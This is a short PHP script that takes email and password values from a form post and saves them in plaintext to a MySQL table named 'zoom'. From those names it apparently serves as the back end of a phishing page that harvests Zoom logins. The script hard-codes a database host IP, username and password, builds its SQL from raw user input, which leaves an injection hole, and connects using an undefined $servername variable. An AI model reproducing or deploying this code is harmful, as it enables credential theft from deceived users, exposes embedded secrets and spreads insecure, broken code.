<?php   
 
//Setup connection variables, such as database username 
//and password 

$hostname="74.124.198.128"; 
$username="asoulh5"; 
$password="\$Mi11ion\$123"; 
$dbname="asoulh5_zoom"; 

// Create a new connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Prepare the SQL statement
$email = $_POST['email'];
$password = $_POST['password'];
$timestamp = date("Y-m-d");
$sql = "INSERT INTO zoom (password, timestamp, email) VALUES ('$password', '$timestamp', '$email')";

// Execute the SQL statement
if ($conn->query($sql) === TRUE) {
    echo "Record saved successfully.";
} else {
    echo "Error saving record: " . $conn->error;
}

// Close the connection
$conn->close();
?>
